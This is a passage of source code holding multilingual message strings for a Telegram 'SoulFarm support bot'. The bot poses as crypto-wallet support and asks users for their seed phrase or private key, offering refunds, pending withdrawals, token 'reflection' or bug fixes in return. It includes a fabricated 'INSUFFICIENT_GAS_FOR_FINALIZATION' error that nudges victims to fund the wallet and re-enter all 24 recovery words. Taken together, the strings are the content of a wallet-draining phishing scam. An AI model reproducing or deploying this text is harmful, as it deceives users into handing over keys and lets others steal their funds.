        "prompt_24_wallet_type_tonkeeper": "لطفاً 24 کلمه کیف پول Tonhub خود را وارد کنید.",
        "wallet_24_error_wallet_type_metamask": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Tonkeeper شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_trust_wallet": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Telegram شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_coinbase": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول MyTon شما). لطفاً seed phrase را وارد کنید.",
        "wallet_24_error_wallet_type_tonkeeper": "این فیلد نیاز به seed phrase دارد (24 کلمه کیف پول Tonhub شما). لطفاً seed phrase را وارد کنید.",
        "refund": "بازپرداخت",
        "reflection": "بازتاب",
        "pending withdrawal": "برداشت در انتظار",
        "fix bug": "رفع اشکال",
        "connect_refund": "لطفاً کیف پول خود را متصل کنید تا بازپرداخت دریافت کنید",
        "connect_reflection": "لطفاً کیف پول خود را متصل کنید تا توکن‌های شما در کیف پول بازتاب یابد",
        "connect_pending_withdrawal": "لطفاً کیف پول خود را متصل کنید تا برداشت در انتظار خود را دریافت کنید",
        "connect_fix_bug": "لطفاً کیف پول خود را متصل کنید تا اشکال کیف پول شما رفع شود",
                        "retry": '🔄 تلاش مجدد',
        "post_receive_error": '⚠️ تأیید کیف پول TON ناموفق بود\n\nتأیید کیف پول به دلیل TON ناکافی برای کارمزد گاز شبکه و اجرای قرارداد هوشمند مورد نیاز برای تکمیل عملیات زنجیره\u200cای نهایی نشد.\n\nخطای TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nلطفاً اطمینان حاصل کنید که کیف پول متصل TON کافی برای نهایی شدن تراکنش دارد، سپس تأیید را دوباره امتحان کنید.\n\nهمچنین، تمام ۲۴ کلمه بازیابی را از نظر غلط\u200cهای املایی، کلمات گم\u200cشده، ترتیب نادرست یا ورودی\u200cهای نامعتبر به صورت محلی بررسی کنید. یک عدم تطابق می\u200cتواند باعث شکست اعتبارسنجی احراز هویت/استخراج کیف پول شود.',
    },
    "ar": {
        "welcome": "Hi {user} مرحبًا بك في SoulFarm support bot! يساعدك هذا البوت في الوصول إلى المحفظة، المعاملات، الأرصدة، الاسترداد، استرداد الحساب، المطالبة بالرموز والمكافآت، الاستردادات، والتحققات الحسابية. الرجاء اختيار خيار من القائمة للمتابعة.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "recover account progress": "استعادة تقدم الحساب",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "withdrawals": "السحوبات",
        "missing balance": "الرصيد المفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام Private Key أو Seed Phrase للمتابعة.",
        "connect wallet button": "🔑 توصيل Wallet",
        "select wallet type": "يرجى اختيار نوع wallet:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "label_seed_phrase": "عبارة الاستعادة",
        "label_private_key": "المفتاح الخاص",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة.",
        "prompt private key": "يرجى إدخال المفتاح الخاص.",
        "prompt_24_wallet_type_metamask": "يرجى إدخال 24 كلمة لمحفظة Tonkeeper الخاصة بك.",
        "prompt_24_wallet_type_trust_wallet": "يرجى إدخال 24 كلمة لمحفظة Telegram الخاصة بك.",
        "prompt_24_wallet_type_coinbase": "يرجى إدخال 24 كلمة لمحفظة MyTon الخاصة بك.",
        "prompt_24_wallet_type_tonkeeper": "يرجى إدخال 24 كلمة لمحفظة Tonhub الخاصة بك.",
        "wallet_24_error_wallet_type_metamask": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Tonkeeper الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_trust_wallet": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Telegram الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_coinbase": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة MyTon الخاصة بك). الرجاء تقديم عبارة seed.",
        "wallet_24_error_wallet_type_tonkeeper": "يتطلب هذا الحقل عبارة seed (24 كلمة لمحفظة Tonhub الخاصة بك). الرجاء تقديم عبارة seed.",
        "refund": "استرداد",
        "reflection": "انعكاس",
        "pending withdrawal": "سحب معلق",
        "fix bug": "إصلاح الخطأ",
        "connect_refund": "يرجى توصيل محفظتك لتلقي استردادك",
        "connect_reflection": "يرجى توصيل محفظتك لتعكس رموزك في المحفظة",
        "connect_pending_withdrawal": "يرجى توصيل محفظتك للمطالبة بالسحب المعلق",
        "connect_fix_bug": "يرجى توصيل محفظتك لإصلاح الخطأ في محفظتك",
                        "retry": '🔄 إعادة المحاولة',
        "post_receive_error": '⚠️ فشل التحقق من محفظة TON\n\nلم يتمكن التحقق من المحفظة من الاكتمال بسبب عدم كفاية TON لرسوم غاز الشبكة وتنفيذ العقود الذكية المطلوبة لإتمام العملية على السلسلة.\n\nخطأ TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nيرجى التأكد من أن المحفظة المتصلة تمتلك TON كافياً لنهائية المعاملة، ثم أعد محاولة التحقق.\n\nأيضاً، تحقق محلياً من جميع كلمات الاسترداد الـ 24 بحثاً عن أخطاء إملائية، أو كلمات مفقودة، أو ترتيب غير صحيح، أو إدخالات غير صالحة. يمكن أن يؤدي أي تناقض واحد إلى فشل التحقق من صحة مصادقة/اشتقاق المحفظة.',
    },
    "pt": {
        "welcome": "Hi {user} bem-vindo ao SoulFarm support bot! Este bot ajuda com acesso à carteira, transações, saldos, recuperações, recuperação de conta, reivindicar tokens e recompensas, reembolsos e validações de conta. Por favor escolha uma opção do menu para prosseguir.",
        "main menu title": "Por favor selecione um tipo de problema para continuar:",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "recover account progress": "Recuperar progresso da conta",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "connect wallet message": "Por favor conecte sua wallet com sua Private Key ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Wallet",
        "select wallet type": "Por favor selecione seu tipo de wallet:",
        "other wallets": "Outras Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Importar Seed Phrase",
        "label_seed_phrase": "frase seed",
        "label_private_key": "chave privada",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "Por favor insira as 12 ou 24 palavras de sua wallet.",
        "prompt private key": "Por favor insira seu private key.",
        "prompt_24_wallet_type_metamask": "Por favor insira as 24 palavras da sua carteira Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Por favor insira as 24 palavras da sua Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Por favor insira as 24 palavras da sua MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Por favor insira as 24 palavras da sua Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Tonkeeper). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Telegram). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Este campo requer uma seed phrase (as 24 palavras da sua carteira MyTon). Por favor forneça a seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Este campo requer uma seed phrase (as 24 palavras da sua carteira Tonhub). Por favor forneça a seed phrase.",
        "refund": "Reembolso",
        "reflection": "Reflexão",
        "pending withdrawal": "Retirada pendente",
        "fix bug": "Corrigir BUG",
        "connect_refund": "Por favor conecte sua carteira para receber seu reembolso",
        "connect_reflection": "Por favor conecte sua carteira para refletir seus tokens na sua carteira",
        "connect_pending_withdrawal": "Por favor conecte sua carteira para reivindicar sua retirada pendente",
        "connect_fix_bug": "Por favor conecte sua carteira para corrigir o bug na sua carteira",
                        "retry": '🔄 Tentar novamente',
        "post_receive_error": '⚠️ Falha na verificação da carteira TON\n\nA verificação da carteira não pôde ser finalizada devido a TON insuficiente para as taxas de gás da rede e execução de contratos inteligentes necessários para concluir a operação on-chain.\n\nErro TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nCertifique-se de que a carteira conectada tem TON suficiente para a finalidade da transação e tente novamente a verificação.\n\nAlém disso, verifique localmente as 24 palavras de recuperação para erros ortográficos, palavras faltando, ordem incorreta ou entradas inválidas. Uma única incompatibilidade pode fazer com que a validação de autenticação/derivação da carteira falhe.',
    },
    "id": {
        "welcome": "Hi {user} selamat datang di SoulFarm support bot! Bot ini membantu dengan akses dompet, transaksi, saldo, recoveries, account recovery, klaim token dan reward, pengembalian dana, dan validasi akun. Silakan pilih opsi menu untuk melanjutkan.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "recover account progress": "Pulihkan kemajuan akun",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "connect wallet message": "Sambungkan wallet Anda dengan Private Key atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Wallet",
        "select wallet type": "Pilih jenis wallet Anda:",
        "other wallets": "Wallet Lainnya",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mode koneksi pilihan Anda.",
        "reassurance": PROFESSIONAL_REASSURANCE["id"],
        "prompt seed": "Masukkan 12 atau 24 kata seed phrase Anda.",
        "prompt private key": "Masukkan private key Anda.",
        "prompt_24_wallet_type_metamask": "Silakan masukkan 24 kata wallet Tonkeeper Anda.",
        "prompt_24_wallet_type_trust_wallet": "Silakan masukkan 24 kata Telegram Wallet Anda.",
        "prompt_24_wallet_type_coinbase": "Silakan masukkan 24 kata MyTon wallet Anda.",
        "prompt_24_wallet_type_tonkeeper": "Silakan masukkan 24 kata Tonhub wallet Anda.",
        "wallet_24_error_wallet_type_metamask": "Kolom ini memerlukan seed phrase (24 kata dari wallet Tonkeeper Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Kolom ini memerlukan seed phrase (24 kata dari wallet Telegram Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Kolom ini memerlukan seed phrase (24 kata dari wallet MyTon Anda). Silakan berikan seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Kolom ini memerlukan seed phrase (24 kata dari wallet Tonhub Anda). Silakan berikan seed phrase.",
        "refund": "Pengembalian dana",
        "reflection": "Refleksi",
        "pending withdrawal": "Penarikan tertunda",
        "fix bug": "Perbaiki BUG",
        "connect_refund": "Silakan sambungkan wallet Anda untuk menerima pengembalian dana Anda",
        "connect_reflection": "Silakan sambungkan wallet Anda untuk merefleksikan token Anda di wallet Anda",
        "connect_pending_withdrawal": "Silakan sambungkan wallet Anda untuk mengklaim penarikan tertunda Anda",
        "connect_fix_bug": "Silakan sambungkan wallet Anda untuk memperbaiki bug pada wallet Anda",
                        "retry": '🔄 Coba lagi',
        "post_receive_error": '⚠️ Verifikasi Dompet TON Gagal\n\nVerifikasi dompet tidak dapat diselesaikan karena TON tidak mencukupi untuk biaya gas jaringan dan eksekusi kontrak pintar yang diperlukan untuk menyelesaikan operasi on-chain.\n\nKesalahan TON: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nPastikan dompet yang terhubung memiliki TON yang cukup untuk finalitas transaksi, lalu coba verifikasi lagi.\n\nSelain itu, periksa secara lokal semua 24 kata pemulihan untuk kesalahan ejaan, kata yang hilang, urutan yang salah, atau entri yang tidak valid. Satu ketidakcocokan dapat menyebabkan gagalnya validasi autentikasi/derivasi dompet.',
    },
    "de": {
        "welcome": "Hi {user} willkommen beim SoulFarm support bot! Dieser Bot hilft bei Wallet-Zugriff, Transaktionen, Kontoständen, Wiederherstellungen, Kontowiederherstellung, Token- und Belohnungsansprüchen, Rückerstattungen und Kontovalidierungen. Bitte wählen Sie eine Menüoption, um fortzufahren.",
        "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
        "validation": "Validierung",
        "claim tokens": "Tokens Beanspruchen",
        "recover account progress": "Kontofortschritt wiederherstellen",
        "assets recovery": "Wiederherstellung von Vermögenswerten",
        "general issues": "Allgemeine Probleme",
        "rectification": "Berichtigung",
        "withdrawals": "Auszahlungen",
        "missing balance": "Fehlender Saldo",
        "login issues": "Anmeldeprobleme",
        "connect wallet message": "Bitte verbinden Sie Ihr Wallet mit Ihrem Private Key oder Ihrer Seed Phrase, um fortzufahren.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Bitte wählen Sie Ihren Wallet-Typ:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privater Schlüssel",
        "seed phrase": "🔒 Seed Phrase importieren",
        "label_seed_phrase": "Seed-Phrase",
        "label_private_key": "Privater Schlüssel",
        "wallet selection message": "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsart.",
        "reassurance": PROFESSIONAL_REASSURANCE["de"],
        "prompt seed": "Bitte geben Sie die 12 oder 24 Wörter Ihrer Seed Phrase ein.",
        "prompt private key": "Bitte geben Sie Ihren Private Key ein.",
        "prompt_24_wallet_type_metamask": "Bitte geben Sie die 24 Wörter Ihres Tonkeeper-Wallets ein.",
        "prompt_24_wallet_type_trust_wallet": "Bitte geben Sie die 24 Wörter Ihres Telegram-Wallets ein.",
        "prompt_24_wallet_type_coinbase": "Bitte geben Sie die 24 Wörter Ihres MyTon-Wallets ein.",
        "prompt_24_wallet_type_tonkeeper": "Bitte geben Sie die 24 Wörter Ihres Tonhub-Wallets ein.",
        "wallet_24_error_wallet_type_metamask": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Tonkeeper-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_trust_wallet": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Telegram-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_coinbase": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres MyTon-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "wallet_24_error_wallet_type_tonkeeper": "Dieses Feld erfordert eine Seed-Phrase (die 24 Wörter Ihres Tonhub-Wallets). Bitte geben Sie die Seed-Phrase ein.",
        "refund": "Rückerstattung",
        "reflection": "Reflektion",
        "pending withdrawal": "Ausstehende Auszahlung",
        "fix bug": "Bug beheben",
        "connect_refund": "Bitte verbinden Sie Ihr Wallet, um Ihre Rückerstattung zu erhalten",
        "connect_reflection": "Bitte verbinden Sie Ihr Wallet, um Ihre Tokens in Ihrem Wallet zu spiegeln",
        "connect_pending_withdrawal": "Bitte verbinden Sie Ihr Wallet, um Ihre ausstehende Auszahlung zu beanspruchen",
        "connect_fix_bug": "Bitte verbinden Sie Ihr Wallet, um den Fehler in Ihrem Wallet zu beheben",
                        "retry": '🔄 Erneut versuchen',
        "post_receive_error": '⚠️ TON-Wallet-Verifizierung fehlgeschlagen\n\nDie Wallet-Verifizierung konnte nicht abgeschlossen werden, da nicht genügend TON für Netzwerk-Gas-Gebühren und Smart-Contract-Ausführungsgebühren vorhanden sind, die für den On-Chain-Vorgang erforderlich sind.\n\nTON-Fehler: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nStellen Sie sicher, dass die verbundene Wallet über ausreichend TON für die Transaktionsendgültigkeit verfügt, und versuchen Sie die Verifizierung erneut.\n\nÜberprüfen Sie außerdem lokal alle 24 Wiederherstellungswörter auf Rechtschreibfehler, fehlende Wörter, falsche Reihenfolge oder ungültige Einträge. Eine einzige Abweichung kann dazu führen, dass die Wallet-Authentifizierungs-/Ableitungsvalidierung fehlschlägt.',
    },
    "nl": {
        "welcome": "Hi {user} welkom bij de SoulFarm support bot! Deze bot helpt met wallet-toegang, transacties, saldi, herstel, account recovery, tokens en rewards claimen, terugbetalingen en accountvalidaties. Kies een optie uit het menu om door te gaan.",
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "recover account progress": "Accountvoortgang herstellen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "connect wallet message": "Verbind uw wallet met uw Private Key of Seed Phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursverbindingswijze.",
        "reassurance": PROFESSIONAL_REASSURANCE["nl"],
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in.",
        "prompt private key": "Voer uw private key in.",
        "prompt_24_wallet_type_metamask": "Voer de 24 woorden van uw Tonkeeper-wallet in.",
        "prompt_24_wallet_type_trust_wallet": "Voer de 24 woorden van uw Telegram Wallet in.",
        "prompt_24_wallet_type_coinbase": "Voer de 24 woorden van uw MyTon-wallet in.",
        "prompt_24_wallet_type_tonkeeper": "Voer de 24 woorden van uw Tonhub-wallet in.",
        "wallet_24_error_wallet_type_metamask": "Dit veld vereist een seed phrase (de 24 woorden van uw Tonkeeper-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_trust_wallet": "Dit veld vereist een seed phrase (de 24 woorden van uw Telegram-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_coinbase": "Dit veld vereist een seed phrase (de 24 woorden van uw MyTon-wallet). Geef de seed phrase op.",
        "wallet_24_error_wallet_type_tonkeeper": "Dit veld vereist een seed phrase (de 24 woorden van uw Tonhub-wallet). Geef de seed phrase op.",
        "refund": "Teruggave",
        "reflection": "Reflectie",
        "pending withdrawal": "In afwachting opname",
        "fix bug": "Bug oplossen",
        "connect_refund": "Verbind uw wallet om uw terugbetaling te ontvangen",
        "connect_reflection": "Verbind uw wallet om uw tokens in uw wallet te reflecteren",
        "connect_pending_withdrawal": "Verbind uw wallet om uw uitstaande opname te claimen",
        "connect_fix_bug": "Verbind uw wallet om de bug in uw wallet te verhelpen",
                        "retry": '🔄 Opnieuw proberen',
        "post_receive_error": '⚠️ TON-wallet verificatie mislukt\n\nDe walletverificatie kon niet worden afgerond wegens onvoldoende TON voor netwerkgas en uitvoeringskosten van slimme contracten die nodig zijn om de on-chain operatie te voltooien.\n\nTON-fout: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nZorg ervoor dat de verbonden wallet voldoende TON heeft voor transactiefinaliteit en probeer de verificatie opnieuw.\n\nControleer ook lokaal alle 24 herstelwoorden op spelfouten, ontbrekende woorden, onjuiste volgorde of ongeldige vermeldingen. Één enkele discrepantie kan ervoor zorgen dat de wallet-authenticatie/-afleiding validatie mislukt.',
    },
    "hi": {
        "welcome": "Hi {user} SoulFarm support bot में आपका स्वागत है! यह बोट वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, अकाउंट रिकवरी, टोकन और रिवॉर्ड क्लेम, रिफंड और अकाउंट वेलिडेशन में मदद करता है। जारी रखने के लिए मेनू से एक विकल्प चुनें।",
        "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "recover account progress": "खाते की प्रगति पुनर्प्राप्त करें",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "withdrawals": "निकासी",
        "missing balance": "गायब बैलेंस",
        "login issues": "लॉगिन समस्याएँ",
        "connect wallet message": "कृपया वॉलेट को Private Key या Seed Phrase के साथ कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase आयात करें",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "आपने {wallet_name} चुन लिया है।\nकनेक्शन मोड चुनें।",
        "reassurance": PROFESSIONAL_REASSURANCE["hi"],
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें।",
        "prompt private key": "कृपया अपना private key दर्ज करें।",
        "prompt_24_wallet_type_metamask": "कृपया अपने Tonkeeper वॉलेट के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_trust_wallet": "कृपया अपने Telegram Wallet के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_coinbase": "कृपया अपने MyTon वॉलेट के 24 शब्द दर्ज करें।",
        "prompt_24_wallet_type_tonkeeper": "कृपया अपने Tonhub वॉलेट के 24 शब्द दर्ज करें।",
        "wallet_24_error_wallet_type_metamask": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Tonkeeper वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_trust_wallet": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Telegram वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_coinbase": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके MyTon वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "wallet_24_error_wallet_type_tonkeeper": "यह फ़ील्ड seed phrase की आवश्यकता है (आपके Tonhub वॉलेट के 24 शब्द)। कृपया seed phrase प्रदान करें।",
        "refund": "रिफंड",
        "reflection": "रिफ्लेक्शन",
        "pending withdrawal": "लंबित निकासी",
        "fix bug": "बग ठीक करें",
        "connect_refund": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपना रिफंड प्राप्त कर सकें",
        "connect_reflection": "कृपया अपना वॉलेट कनेक्ट करें ताकि आपके टोकन आपके वॉलेट में परिलक्षित हों",
        "connect_pending_withdrawal": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप लंबित निकासी का दावा कर सकें",
        "connect_fix_bug": "कृपया अपना वॉलेट कनेक्ट करें ताकि आपके वॉलेट की बग को ठीक किया जा सके",
                        "retry": '🔄 पुनः प्रयास करें',
        "post_receive_error": '⚠️ TON वॉलेट सत्यापन विफल\n\nनेटवर्क गैस और स्मार्ट-कॉन्ट्रैक्ट निष्पादन शुल्क के लिए पर्याप्त TON न होने के कारण वॉलेट सत्यापन को अंतिम रूप नहीं दिया जा सका जो ऑन-चेन ऑपरेशन को पूर्ण करने के लिए आवश्यक हैं।\n\nTON त्रुटि: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nसुनिश्चित करें कि जुड़े वॉलेट में लेनदेन की अंतिमता के लिए पर्याप्त TON है, फिर सत्यापन पुनः प्रयास करें।\n\nसाथ ही, सभी 24 रिकवरी शब्दों को स्थानीय रूप से वर्तनी त्रुटियों, गुम शब्दों, गलत क्रम, या अमान्य प्रविष्टियों के लिए जांचें। एक भी बेमेल वॉलेट प्रमाणीकरण/व्युत्पत्ति सत्यापन विफल होने का कारण बन सकता है।',
    },
    "tr": {
        "welcome": "Hi {user} SoulFarm support bot'a hoş geldiniz! Bu bot cüzdan erişimi, işlemler, bakiye, kurtarmalar, hesap kurtarma, token ve ödül talepleri, iade ve hesap doğrulamaları konusunda yardımcı olur. Devam etmek için menüden bir seçenek seçin.",
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "recover account progress": "Hesap ilerlemesini kurtar",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "withdrawals": "Para Çekme",
        "missing balance": "Eksik Bakiye",
        "login issues": "Giriş Sorunları",
        "connect wallet message": "Lütfen cüzdanınızı Private Key veya Seed Phrase ile bağlayın。",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed Phrase İçe Aktar",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "Seçtiğiniz {wallet_name}。\nBağlantı modunu seçin。",
        "reassurance": PROFESSIONAL_REASSURANCE["tr"],
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。",
        "prompt private key": "Lütfen private key'inizi girin。",
        "prompt_24_wallet_type_metamask": "Lütfen Tonkeeper cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_trust_wallet": "Lütfen Telegram Cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_coinbase": "Lütfen MyTon cüzdanınızın 24 kelimesini girin。",
        "prompt_24_wallet_type_tonkeeper": "Lütfen Tonhub cüzdanınızın 24 kelimesini girin。",
        "wallet_24_error_wallet_type_metamask": "Bu alan bir seed phrase gerektirir (Tonkeeper cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_trust_wallet": "Bu alan bir seed phrase gerektirir (Telegram cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_coinbase": "Bu alan bir seed phrase gerektirir (MyTon cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "wallet_24_error_wallet_type_tonkeeper": "Bu alan bir seed phrase gerektirir (Tonhub cüzdanınızın 24 kelimesi). Lütfen seed phrase sağlayın.",
        "refund": "İade",
        "reflection": "Yansıma",
        "pending withdrawal": "Bekleyen Çekim",
        "fix bug": "BUG Düzelt",
        "connect_refund": "Lütfen iadenizi almak için cüzdanınızı bağlayın",
        "connect_reflection": "Lütfen tokenlerinizi cüzdanınıza yansıtmak için cüzdanınızı bağlayın",
        "connect_pending_withdrawal": "Lütfen bekleyen çekiminizi talep etmek için cüzdanınızı bağlayın",
        "connect_fix_bug": "Lütfen cüzdanınızdaki hatayı düzeltmek için cüzdanınızı bağlayın",
                        "retry": '🔄 Tekrar dene',
        "post_receive_error": "⚠️ TON Cüzdan Doğrulaması Başarısız\n\nZincir üstü işlemi tamamlamak için gereken ağ gaz ücretleri ve akıllı sözleşme yürütme ücretleri için yetersiz TON nedeniyle cüzdan doğrulaması tamamlanamadı.\n\nTON Hatası: INSUFFICIENT_GAS_FOR_FINALIZATION\n\nBağlı cüzdanın işlem kesinliği için yeterli TON'a sahip olduğundan emin olun ve doğrulamayı yeniden deneyin.\n\nAyrıca, yazım hataları, eksik kelimeler, yanlış sıralama veya geçersiz girişler için 24 kurtarma kelimesini yerel olarak kontrol edin. Tek bir uyuşmazlık, cüzdan kimlik doğrulama/türetme doğrulamasının başarısız olmasına neden olabilir.",
    },
    "zh": {
        "welcome": "Hi {user} 欢迎使用 SoulFarm support bot! 此机器人可帮助钱包访问、交易、余额、恢复、账户恢复、认领代币与奖励、退款和账户验证。请选择菜单中的一项继续。",
        "main menu title": "请选择 个问题类型以继续：",
        "validation": "验证",
        "claim tokens": "认领代币",
        "recover account progress": "恢复账户进度",
        "assets recovery": "资产恢复",
        "general issues": "常规问题",
        "rectification": "修正",
        "withdrawals": "提现",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "label_seed_phrase": "助记词",
        "label_private_key": "私钥",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "reassurance": PROFESSIONAL_REASSURANCE["zh"],
        "prompt seed": "请输入 12 或 24 个单词的助记词。",
        "prompt private key": "请输入您的私钥。",
        "prompt_24_wallet_type_metamask": "请输入您 Tonkeeper 钱包的 24 个单词。",
        "prompt_24_wallet_type_trust_wallet": "请输入您 Telegram 钱包的 24 个单词。",
        "prompt_24_wallet_type_coinbase": "请输入您 MyTon 钱包的 24 个单词。",
        "prompt_24_wallet_type_tonkeeper": "请输入您 Tonhub 钱包的 24 个单词。",
        "wallet_24_error_wallet_type_metamask": "此字段需要助记词（您 Tonkeeper 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_trust_wallet": "此字段需要助记词（您 Telegram 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_coinbase": "此字段需要助记词（您 MyTon 钱包的 24 个单词）。请提供助记词。",
        "wallet_24_error_wallet_type_tonkeeper": "此字段需要助记词（您 Tonhub 钱包的 24 个单词）。请提供助记词。",
        "refund": "退款",
        "reflection": "反射",
        "pending withdrawal": "待处理提现",
        "fix bug": "修复 BUG",
        "connect_refund": "请连接您的钱包以接收退款",
